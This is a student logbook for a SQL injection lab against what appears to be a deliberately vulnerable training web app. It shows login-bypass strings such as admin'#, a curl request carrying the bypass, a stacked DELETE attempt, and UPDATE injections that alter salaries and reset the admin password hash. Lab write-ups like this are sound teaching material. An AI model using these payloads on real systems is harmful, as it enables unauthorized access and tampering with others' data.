# Logbook 8

## Lab Environment 

Fist, we enter the /etc/hosts file and added the IP address “10.9.0.5” and the URL for the web application.

![Alt text](/images/logbook8_1.png)

Next, we followed the commands given.

![Alt text](/images/logbook8_2.png)

![Alt text](/images/logbook8_3.png)

## Task 1 

To make this task we followed the instructions given in the lab and used the mysql client program to interact with the database.

![Alt text](/images/logbook8_4.png)

After that, we use the command “use sqllab_users;” to load the database. 

![Alt text](/images/logbook8_5.png)

After running the commands above, we used the command “SELECT * FROM credential WHERE Name = ‘Alice’;” to provide all the profile information of the employee Alice like was asked. 

![Alt text](/images/logbook8_6.png)

## Task 2.1

We acessed the website "www.seed-server.com" and then we went to the file "unsafe_home.php".
The original file looks like this "WHERE name= '$input_uname' and Password='$hashed_pwd'" and we changed for "WHERE name='admin'# and Password=’$hashed_pwd’" to guarantee privileged access, as all keyword checking becomes irrelevant once it is commented. 

![Alt text](/images/logbook8_7.png)

Then we went to the website and logged in with "admin'#". We could see successfully with administrator privileges. 

![Alt text](/images/logbook8_8.png)

## Task 2.2

Next we perform an attack via a GET request using `curl`:

```note
curl 'www.seed-server.com/unsafe_home.php/username=admin%27%20%23&Password=11'
```

![Alt text](/images/Logbook8-1.png)

## Task 2.3

We tried appending SQL commands using ";" to have a server-side effect, such as deleting the credentials table:

```SQL
'; DELETE FROM credential WHERE id=1; #
```

Howerver, the operation failed due to a database error.

![Alt text](/images/Logbook8-2.png)

According to the sources, the MySQL extension used by the server's PHP prevents the execution of multiple queries, impeding the completion of the attack.

## Task 3.1

After logging in with a system account (e.g. username = Alice' #), we gained access to a page that allowed us to edit personal data. The file managing this functionality is `unsafe_edit_backend.php`, that features a dynamically formed query with unsanitized user input. Our attack focuses on manipulating the "email" field to change the user's salary.

```SQL
alice@gmail.com', Salary=' 999999
```

![Alt text](/images/Logbook8-3.png)

![Alt text](/images/Logbook8-4.png)

## Task 3.2

Now we're going to try to change another user's salary, for this we used a similar technique, with a different WHERE clause and commenting out the system's to avoind interference.

```SQL
', Salary='1' WHERE Name='Boby'#
```

![Alt text](/images/Logbook8-5.png)

![Alt text](/images/Logbook8-6.png)

## Task 3.3

To change a user's password, again, we're going to use a similar technique, but this time the value to be modified is encrypted with SHA1 encryption. For instance, for the new password `1234`, the hash is `7110eda4d09e062aa5e4a390b0a572ac0d2c0220`. 

```SQL
', password='7110eda4d09e062aa5e4a390b0a572ac0d2c0220' WHERE name='Admin'#
```

![Alt text](/images/Logbook8-7.png)

